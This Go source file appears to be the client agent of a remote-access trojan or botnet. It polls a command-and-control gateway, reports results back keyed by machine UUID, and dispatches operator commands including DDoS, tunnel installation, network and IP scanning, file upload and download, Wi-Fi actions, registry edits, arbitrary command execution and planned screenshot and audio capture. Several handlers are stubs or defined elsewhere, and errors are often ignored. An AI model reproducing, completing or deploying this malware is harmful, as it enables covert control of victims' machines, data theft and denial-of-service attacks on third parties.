package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
)

var ErrInvalidPacket = errors.New("The packet received is incorect")
var ErrRuntime = errors.New("An error occur when the command start")

type CommandBase struct {
	Name string `json:"name"`
	Args interface{}
}
type RunCommandParams struct {
	Command string `json:"command"`
}

func getCommandName(body []byte) (string, []byte) {
	log.Println(string(body[:]))
	data := CommandBase{}
	err := json.Unmarshal(body, &data)
	if err != nil {
		log.Fatal(err)
	}

	return data.Name, body
}

func runCommand(params RunCommandParams) {

}

func SetInvalidPayload() {}

func ReplyToC2(result string) {

	fmt.Println("[REPLY] - Sending response to C2...")

	config := loadConfig(true)

	url := config.Gateway + "/"

	uuid, err := GetMachineUUID()

	if err != nil {

	}

	var jsonData = []byte(`{
		"name": "COMMAND_RESULT",
		"id": "` + uuid + `",
		"result" : ` + result + `
	}`)

	request, error := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	request.Header.Set("Content-Type", "application/json; charset=UTF-8")

	client := &http.Client{}
	response, error := client.Do(request)
	if error != nil {
		panic(error)
	}
	defer response.Body.Close()

}

func ReplyErrToC2(err error) {}

func getCommand() {

	fmt.Println("[COMMAND] - Fetching command to execute...")

	config := loadConfig(true)

	url := config.Gateway + "/"

	uuid, err := GetMachineUUID()

	if err != nil {

	}
	data := map[string]interface{}{
		"name": "GET_COMMANDS",
		"id":   uuid,
	}

	b, err := json.Marshal(data)

	if err != nil {
		fmt.Println("Error during json")
	}

	request, err := http.NewRequest("POST", url, bytes.NewBuffer(b))
	request.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println("Error during the get command req")
	}
	defer response.Body.Close()

	receivedData, err := io.ReadAll(response.Body)

	if err != nil {
	}

	name, byteBody := getCommandName(receivedData)

	switch name {

	case "Announce":
		_ = announce()
		break

	case "SetRelay":
		data := SetRelayParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		setRelay(data)
		ReplyToC2(`{ "success" : true, "message" : "Relay has been edited successfully !" }`)
		// TODO need to restart agent -> best solution is reboot
		break

	case "SetPullingRate":
		data := SetPullingRateParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		setPullingRate(data)
		ReplyToC2(`{ "success" : true, "message" : "PullingRate has been edited successfully !" }`)
		break

	case "OpenTunnel":
		data := OpenTunnelParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		url, err := openTunnel(data)

		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		ReplyToC2(fmt.Sprintf(`{ "success" : true, "message" : "OpenTunnel on '%s' " }`, url))
		break

	case "InstallTunnel":
		data := InstallTunnelParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		_, err := installTunnel(data)
		if err != nil {
			ReplyToC2(`{ "success" : false, "message" : "Can't install the tunnel'" }`)
		}

	case "InstallIpScanner":
		data := InstallIpScannerParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		_, err := installIpScanner(data)
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}
		ReplyToC2(`{ "success" : true, "message" : "IpScanner has been installed successfully" }`)

	case "GetSysInfo":
		data := GetSysInfoParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		scanResult, err := getSysInfo(data)
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}
		ReplyToC2(fmt.Sprintf(`{ "success" : true, "message" : "%s" }`, scanResult))

	case "Ping":
		data := PingParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		result, err := ping(data)

		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}
		fmt.Println(result)
		ReplyToC2(`{ "success" : true, "message" : "ping success" }`)

	case "Wifi":
		data := WifiParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}
		wifi(data)
	case "Ddos":
		data := DdosParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		ddos(data)
	case "DownloadFile":
		data := DownloadFileParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		downloadFile(data)

	case "NetworkScan":
		data := NetworkScanParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		networkScan(data)
	case "UploadFile":
		data := UploadFileParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		uploadFile(data)
	case "GetPublicIp":
		data := GetPublicIpParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		getPublicIp(data)
	case "GetPrivateIp":
		data := GetPrivateIpParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		getPrivateIp(data)
	case "CreateRegValue":
		data := CreateRegValueParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		CreateRegValue(data)
	case "EditRegValue":
		data := EditRegValueParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		EditRegValue(data)

	case "DeleteRegValue":
		data := DeleteRegValueParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		DeleteRegValue(data)

	case "RunCommand":
		data := RunCommandParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		runCommand(data)

	case "Screenshot":
		break
	case "AudioCapture":
		// TODO
		break

	case "Idle":
		// TODO
		break
	default:
		fmt.Println("Not handled command")
		fmt.Println(name)
		break
	}

}
